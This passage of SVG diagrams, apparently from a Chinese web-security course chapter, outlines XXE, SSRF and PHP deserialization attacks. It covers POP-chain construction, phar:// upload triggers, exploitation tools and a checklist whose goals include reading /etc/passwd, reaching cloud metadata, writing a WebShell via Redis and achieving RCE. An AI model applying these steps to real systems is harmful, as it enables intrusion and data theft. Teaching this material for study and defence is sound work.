  <text x="410" y="195.5" text-anchor="middle" fill="#334155" font-weight="600" font-size="12">DNS静态解析</text>
  <rect x="540" y="163" width="220" height="55" rx="10" fill="#ecfeff" stroke="#64748b" stroke-width="2"/>
  <text x="650" y="195.5" text-anchor="middle" fill="#334155" font-weight="600" font-size="12">出口ACL</text>
</svg>

<svg width="800" height="236" xmlns="http://www.w3.org/2000/svg" viewBox="0 0 800 236">
  <defs><linearGradient id="g0sb5jsya" x1="0" y1="0" x2="1" y2="1"><stop offset="0%" stop-color="#eff6ff"/><stop offset="100%" stop-color="#dbeafe"/></linearGradient></defs>
  <rect x="0" y="0" width="800" height="236" rx="12" fill="url(#g0sb5jsya)"/>
  <rect x="12" y="12" width="776" height="44" rx="8" fill="#78350f" opacity="0.88"/>
  <text x="400" y="40" text-anchor="middle" fill="#ffffff" font-weight="bold" font-size="18">🔬 PHP serialize/unserialize原理</text>
  <rect x="60" y="90" width="220" height="55" rx="10" fill="#eff6ff" stroke="#64748b" stroke-width="2"/>
  <text x="170" y="122.5" text-anchor="middle" fill="#334155" font-weight="600" font-size="12">对象→字符串 serialize</text>
  <rect x="300" y="90" width="220" height="55" rx="10" fill="#f0fdf4" stroke="#64748b" stroke-width="2"/>
  <text x="410" y="122.5" text-anchor="middle" fill="#334155" font-weight="600" font-size="12">__sleep触发</text>
  <rect x="540" y="90" width="220" height="55" rx="10" fill="#fef3c7" stroke="#64748b" stroke-width="2"/>
  <text x="650" y="122.5" text-anchor="middle" fill="#334155" font-weight="600" font-size="12">字符串→对象 unserialize</text>
  <rect x="60" y="163" width="220" height="55" rx="10" fill="#fce7f3" stroke="#64748b" stroke-width="2"/>
  <text x="170" y="195.5" text-anchor="middle" fill="#334155" font-weight="600" font-size="12">__wakeup触发</text>
  <rect x="300" y="163" width="220" height="55" rx="10" fill="#f5f3ff" stroke="#64748b" stroke-width="2"/>
  <text x="410" y="195.5" text-anchor="middle" fill="#334155" font-weight="600" font-size="12">注入POP链</text>
</svg>

<svg width="800" height="236" xmlns="http://www.w3.org/2000/svg" viewBox="0 0 800 236">
  <defs><linearGradient id="g3qiowxu7" x1="0" y1="0" x2="1" y2="1"><stop offset="0%" stop-color="#eff6ff"/><stop offset="100%" stop-color="#dbeafe"/></linearGradient></defs>
  <rect x="0" y="0" width="800" height="236" rx="12" fill="url(#g3qiowxu7)"/>
  <rect x="12" y="12" width="776" height="44" rx="8" fill="#92400e" opacity="0.88"/>
  <text x="400" y="40" text-anchor="middle" fill="#ffffff" font-weight="bold" font-size="18">🦴 PHP 魔术方法生命周期</text>
  <rect x="60" y="90" width="220" height="55" rx="10" fill="#eff6ff" stroke="#64748b" stroke-width="2"/>
  <text x="170" y="122.5" text-anchor="middle" fill="#334155" font-weight="600" font-size="12">__construct 构造</text>
  <rect x="300" y="90" width="220" height="55" rx="10" fill="#f0fdf4" stroke="#64748b" stroke-width="2"/>
  <text x="410" y="122.5" text-anchor="middle" fill="#334155" font-weight="600" font-size="12">__destruct 析构</text>
  <rect x="540" y="90" width="220" height="55" rx="10" fill="#fef3c7" stroke="#64748b" stroke-width="2"/>
  <text x="650" y="122.5" text-anchor="middle" fill="#334155" font-weight="600" font-size="12">__toString 转字符串</text>
  <rect x="60" y="163" width="220" height="55" rx="10" fill="#fce7f3" stroke="#64748b" stroke-width="2"/>
  <text x="170" y="195.5" text-anchor="middle" fill="#334155" font-weight="600" font-size="12">__call/__callStatic</text>
  <rect x="300" y="163" width="220" height="55" rx="10" fill="#f5f3ff" stroke="#64748b" stroke-width="2"/>
  <text x="410" y="195.5" text-anchor="middle" fill="#334155" font-weight="600" font-size="12">__get/__set 访问</text>
  <rect x="540" y="163" width="220" height="55" rx="10" fill="#ecfeff" stroke="#64748b" stroke-width="2"/>
  <text x="650" y="195.5" text-anchor="middle" fill="#334155" font-weight="600" font-size="12">__invoke 调用</text>
</svg>

<svg width="800" height="236" xmlns="http://www.w3.org/2000/svg" viewBox="0 0 800 236">
  <defs><linearGradient id="gy9jti0zm" x1="0" y1="0" x2="1" y2="1"><stop offset="0%" stop-color="#eff6ff"/><stop offset="100%" stop-color="#dbeafe"/></linearGradient></defs>
  <rect x="0" y="0" width="800" height="236" rx="12" fill="url(#gy9jti0zm)"/>
  <rect x="12" y="12" width="776" height="44" rx="8" fill="#b45309" opacity="0.88"/>
  <text x="400" y="40" text-anchor="middle" fill="#ffffff" font-weight="bold" font-size="18">🔗 POP 链构造四步法</text>
  <rect x="60" y="90" width="220" height="55" rx="10" fill="#eff6ff" stroke="#64748b" stroke-width="2"/>
  <text x="170" y="122.5" text-anchor="middle" fill="#334155" font-weight="600" font-size="12">① 终点 __destruct</text>
  <rect x="300" y="90" width="220" height="55" rx="10" fill="#f0fdf4" stroke="#64748b" stroke-width="2"/>
  <text x="410" y="122.5" text-anchor="middle" fill="#334155" font-weight="600" font-size="12">② 中转 __call/toString</text>
  <rect x="540" y="90" width="220" height="55" rx="10" fill="#fef3c7" stroke="#64748b" stroke-width="2"/>
  <text x="650" y="122.5" text-anchor="middle" fill="#334155" font-weight="600" font-size="12">③ 起点 unserialize触发</text>
  <rect x="60" y="163" width="220" height="55" rx="10" fill="#fce7f3" stroke="#64748b" stroke-width="2"/>
  <text x="170" y="195.5" text-anchor="middle" fill="#334155" font-weight="600" font-size="12">④ 组装对象 serialize</text>
</svg>

<svg width="800" height="236" xmlns="http://www.w3.org/2000/svg" viewBox="0 0 800 236">
  <defs><linearGradient id="gx9jkvzc2" x1="0" y1="0" x2="1" y2="1"><stop offset="0%" stop-color="#eff6ff"/><stop offset="100%" stop-color="#dbeafe"/></linearGradient></defs>
  <rect x="0" y="0" width="800" height="236" rx="12" fill="url(#gx9jkvzc2)"/>
  <rect x="12" y="12" width="776" height="44" rx="8" fill="#0369a1" opacity="0.88"/>
  <text x="400" y="40" text-anchor="middle" fill="#ffffff" font-weight="bold" font-size="18">📦 phar:// 伪协议触发流程</text>
  <rect x="60" y="90" width="220" height="55" rx="10" fill="#eff6ff" stroke="#64748b" stroke-width="2"/>
  <text x="170" y="122.5" text-anchor="middle" fill="#334155" font-weight="600" font-size="12">构造phar文件存Meta</text>
  <rect x="300" y="90" width="220" height="55" rx="10" fill="#f0fdf4" stroke="#64748b" stroke-width="2"/>
  <text x="410" y="122.5" text-anchor="middle" fill="#334155" font-weight="600" font-size="12">改后缀图片上传</text>
  <rect x="540" y="90" width="220" height="55" rx="10" fill="#fef3c7" stroke="#64748b" stroke-width="2"/>
  <text x="650" y="122.5" text-anchor="middle" fill="#334155" font-weight="600" font-size="12">file_exists/stat触发</text>
  <rect x="60" y="163" width="220" height="55" rx="10" fill="#fce7f3" stroke="#64748b" stroke-width="2"/>
  <text x="170" y="195.5" text-anchor="middle" fill="#334155" font-weight="600" font-size="12">phar://读取</text>
  <rect x="300" y="163" width="220" height="55" rx="10" fill="#f5f3ff" stroke="#64748b" stroke-width="2"/>
  <text x="410" y="195.5" text-anchor="middle" fill="#334155" font-weight="600" font-size="12">反序列化执行</text>
</svg>

<svg width="800" height="236" xmlns="http://www.w3.org/2000/svg" viewBox="0 0 800 236">
  <defs><linearGradient id="gqd6vzkwa" x1="0" y1="0" x2="1" y2="1"><stop offset="0%" stop-color="#eff6ff"/><stop offset="100%" stop-color="#dbeafe"/></linearGradient></defs>
  <rect x="0" y="0" width="800" height="236" rx="12" fill="url(#gqd6vzkwa)"/>
  <rect x="12" y="12" width="776" height="44" rx="8" fill="#7c3aed" opacity="0.88"/>
  <text x="400" y="40" text-anchor="middle" fill="#ffffff" font-weight="bold" font-size="18">🧠 Session 反序列化三引擎</text>
  <rect x="60" y="90" width="220" height="55" rx="10" fill="#eff6ff" stroke="#64748b" stroke-width="2"/>
  <text x="170" y="122.5" text-anchor="middle" fill="#334155" font-weight="600" font-size="12">php 键名|竖线格式</text>
  <rect x="300" y="90" width="220" height="55" rx="10" fill="#f0fdf4" stroke="#64748b" stroke-width="2"/>
  <text x="410" y="122.5" text-anchor="middle" fill="#334155" font-weight="600" font-size="12">php_binary 长度+名字</text>
  <rect x="540" y="90" width="220" height="55" rx="10" fill="#fef3c7" stroke="#64748b" stroke-width="2"/>
  <text x="650" y="122.5" text-anchor="middle" fill="#334155" font-weight="600" font-size="12">php_serialize 原生数组</text>
  <rect x="60" y="163" width="220" height="55" rx="10" fill="#fce7f3" stroke="#64748b" stroke-width="2"/>
  <text x="170" y="195.5" text-anchor="middle" fill="#334155" font-weight="600" font-size="12">ini_set切换引擎</text>
  <rect x="300" y="163" width="220" height="55" rx="10" fill="#f5f3ff" stroke="#64748b" stroke-width="2"/>
  <text x="410" y="195.5" text-anchor="middle" fill="#334155" font-weight="600" font-size="12">触发条件不一致</text>
</svg>

<svg width="800" height="236" xmlns="http://www.w3.org/2000/svg" viewBox="0 0 800 236">
  <defs><linearGradient id="g3ow7ilkl" x1="0" y1="0" x2="1" y2="1"><stop offset="0%" stop-color="#eff6ff"/><stop offset="100%" stop-color="#dbeafe"/></linearGradient></defs>
  <rect x="0" y="0" width="800" height="236" rx="12" fill="url(#g3ow7ilkl)"/>
  <rect x="12" y="12" width="776" height="44" rx="8" fill="#0e7490" opacity="0.88"/>
  <text x="400" y="40" text-anchor="middle" fill="#ffffff" font-weight="bold" font-size="18">📖 本章知识点树状图</text>
  <rect x="60" y="90" width="220" height="55" rx="10" fill="#eff6ff" stroke="#64748b" stroke-width="2"/>
  <text x="170" y="122.5" text-anchor="middle" fill="#334155" font-weight="600" font-size="12">XXE: 有回显/OOB/Blind</text>
  <rect x="300" y="90" width="220" height="55" rx="10" fill="#f0fdf4" stroke="#64748b" stroke-width="2"/>
  <text x="410" y="122.5" text-anchor="middle" fill="#334155" font-weight="600" font-size="12">SSRF: 协议/绕过/Redis</text>
  <rect x="540" y="90" width="220" height="55" rx="10" fill="#fef3c7" stroke="#64748b" stroke-width="2"/>
  <text x="650" y="122.5" text-anchor="middle" fill="#334155" font-weight="600" font-size="12">PHP反序列化: 魔术方法</text>
  <rect x="60" y="163" width="220" height="55" rx="10" fill="#fce7f3" stroke="#64748b" stroke-width="2"/>
  <text x="170" y="195.5" text-anchor="middle" fill="#334155" font-weight="600" font-size="12">PHP反序列化: POP/phar</text>
</svg>

<svg width="800" height="236" xmlns="http://www.w3.org/2000/svg" viewBox="0 0 800 236">
  <defs><linearGradient id="gkupn6gdc" x1="0" y1="0" x2="1" y2="1"><stop offset="0%" stop-color="#eff6ff"/><stop offset="100%" stop-color="#dbeafe"/></linearGradient></defs>
  <rect x="0" y="0" width="800" height="236" rx="12" fill="url(#gkupn6gdc)"/>
  <rect x="12" y="12" width="776" height="44" rx="8" fill="#0f766e" opacity="0.88"/>
  <text x="400" y="40" text-anchor="middle" fill="#ffffff" font-weight="bold" font-size="18">🛠️ 本章工具矩阵清单</text>
  <rect x="60" y="90" width="220" height="55" rx="10" fill="#eff6ff" stroke="#64748b" stroke-width="2"/>
  <text x="170" y="122.5" text-anchor="middle" fill="#334155" font-weight="600" font-size="12">Burp Collaborator</text>
  <rect x="300" y="90" width="220" height="55" rx="10" fill="#f0fdf4" stroke="#64748b" stroke-width="2"/>
  <text x="410" y="122.5" text-anchor="middle" fill="#334155" font-weight="600" font-size="12">XXEinjector</text>
  <rect x="540" y="90" width="220" height="55" rx="10" fill="#fef3c7" stroke="#64748b" stroke-width="2"/>
  <text x="650" y="122.5" text-anchor="middle" fill="#334155" font-weight="600" font-size="12">SSRFmap</text>
  <rect x="60" y="163" width="220" height="55" rx="10" fill="#fce7f3" stroke="#64748b" stroke-width="2"/>
  <text x="170" y="195.5" text-anchor="middle" fill="#334155" font-weight="600" font-size="12">gopherus</text>
  <rect x="300" y="163" width="220" height="55" rx="10" fill="#f5f3ff" stroke="#64748b" stroke-width="2"/>
  <text x="410" y="195.5" text-anchor="middle" fill="#334155" font-weight="600" font-size="12">phpggc</text>
  <rect x="540" y="163" width="220" height="55" rx="10" fill="#ecfeff" stroke="#64748b" stroke-width="2"/>
  <text x="650" y="195.5" text-anchor="middle" fill="#334155" font-weight="600" font-size="12">PHP-Serialization-RCE</text>
</svg>

<svg width="800" height="236" xmlns="http://www.w3.org/2000/svg" viewBox="0 0 800 236">
  <defs><linearGradient id="guz9b9pdg" x1="0" y1="0" x2="1" y2="1"><stop offset="0%" stop-color="#eff6ff"/><stop offset="100%" stop-color="#dbeafe"/></linearGradient></defs>
  <rect x="0" y="0" width="800" height="236" rx="12" fill="url(#guz9b9pdg)"/>
  <rect x="12" y="12" width="776" height="44" rx="8" fill="#be123c" opacity="0.88"/>
  <text x="400" y="40" text-anchor="middle" fill="#ffffff" font-weight="bold" font-size="18">🎓 本章难度进度条</text>
  <rect x="60" y="90" width="220" height="55" rx="10" fill="#eff6ff" stroke="#64748b" stroke-width="2"/>
  <text x="170" y="122.5" text-anchor="middle" fill="#334155" font-weight="600" font-size="12">XXE基础 ████░░ 40%</text>
  <rect x="300" y="90" width="220" height="55" rx="10" fill="#f0fdf4" stroke="#64748b" stroke-width="2"/>
  <text x="410" y="122.5" text-anchor="middle" fill="#334155" font-weight="600" font-size="12">XXE深入 ███████░ 80%</text>
  <rect x="540" y="90" width="220" height="55" rx="10" fill="#fef3c7" stroke="#64748b" stroke-width="2"/>
  <text x="650" y="122.5" text-anchor="middle" fill="#334155" font-weight="600" font-size="12">SSRF ██████░░ 60%</text>
  <rect x="60" y="163" width="220" height="55" rx="10" fill="#fce7f3" stroke="#64748b" stroke-width="2"/>
  <text x="170" y="195.5" text-anchor="middle" fill="#334155" font-weight="600" font-size="12">PHP反序列化 █████░░░ 50%</text>
</svg>

<svg width="800" height="236" xmlns="http://www.w3.org/2000/svg" viewBox="0 0 800 236">
  <defs><linearGradient id="grcys278t" x1="0" y1="0" x2="1" y2="1"><stop offset="0%" stop-color="#eff6ff"/><stop offset="100%" stop-color="#dbeafe"/></linearGradient></defs>
  <rect x="0" y="0" width="800" height="236" rx="12" fill="url(#grcys278t)"/>
  <rect x="12" y="12" width="776" height="44" rx="8" fill="#166534" opacity="0.88"/>
  <text x="400" y="40" text-anchor="middle" fill="#ffffff" font-weight="bold" font-size="18">✅ 通关自测CheckList</text>
  <rect x="60" y="90" width="220" height="55" rx="10" fill="#eff6ff" stroke="#64748b" stroke-width="2"/>
  <text x="170" y="122.5" text-anchor="middle" fill="#334155" font-weight="600" font-size="12">读/etc/passwd成功</text>
  <rect x="300" y="90" width="220" height="55" rx="10" fill="#f0fdf4" stroke="#64748b" stroke-width="2"/>
  <text x="410" y="122.5" text-anchor="middle" fill="#334155" font-weight="600" font-size="12">Blind XXE DNS请求</text>
  <rect x="540" y="90" width="220" height="55" rx="10" fill="#fef3c7" stroke="#64748b" stroke-width="2"/>
  <text x="650" y="122.5" text-anchor="middle" fill="#334155" font-weight="600" font-size="12">SSRF访问云元数据</text>
  <rect x="60" y="163" width="220" height="55" rx="10" fill="#fce7f3" stroke="#64748b" stroke-width="2"/>
  <text x="170" y="195.5" text-anchor="middle" fill="#334155" font-weight="600" font-size="12">Redis写WebShell</text>
  <rect x="300" y="163" width="220" height="55" rx="10" fill="#f5f3ff" stroke="#64748b" stroke-width="2"/>
  <text x="410" y="195.5" text-anchor="middle" fill="#334155" font-weight="600" font-size="12">POP链RCE</text>
  <rect x="540" y="163" width="220" height="55" rx="10" fill="#ecfeff" stroke="#64748b" stroke-width="2"/>
  <text x="650" y="195.5" text-anchor="middle" fill="#334155" font-weight="600" font-size="12">phar://触发</text>
</svg>
